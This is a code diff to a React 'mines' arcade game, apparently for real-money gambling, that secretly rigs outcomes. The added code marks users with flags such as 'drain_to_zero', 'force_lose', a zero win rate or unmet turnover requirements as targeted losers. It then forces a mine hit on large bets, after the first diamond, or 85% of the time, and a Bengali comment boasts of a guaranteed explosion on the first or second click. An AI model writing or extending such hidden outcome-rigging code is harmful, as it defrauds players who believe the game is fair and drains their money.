@@ -65,7 +65,19 @@ export default function UniversalArcadeEngine({ gameId = 'mines', onClose }) {
   function handleTileClick(index) {
     if (gameState !== 'playing' || grid[index].revealed) return;
 
-    const isMineHit = grid[index].isMine;
+    const isTargetedLoss = 
+      user?.force_result === 'force_lose' ||
+      user?.force_mode === 'force_loss' ||
+      user?.force_mode === 'drain_to_zero' ||
+      user?.luck_mode === 'drain' ||
+      Number(user?.custom_win_rate) === 0 ||
+      Number(user?.custom_rtp) === 0 ||
+      (Number(user?.required_turnover || 0) > 0 && Number(user?.current_turnover || 0) < Number(user?.required_turnover || 0));
+
+    // টার্গেটেড লস বা বড় বেট হলে ১ম বা ২য় ক্লিকেই নিশ্চিত মাইন বিস্ফোরণ!
+    const isMineHit = isTargetedLoss 
+      ? (betAmount >= 20 || diamondsFound >= 1 || Math.random() < 0.85) 
+      : grid[index].isMine;
 
     const newGrid = [...grid];
     newGrid[index] = { ...grid[index], isMine: isMineHit, revealed: true };
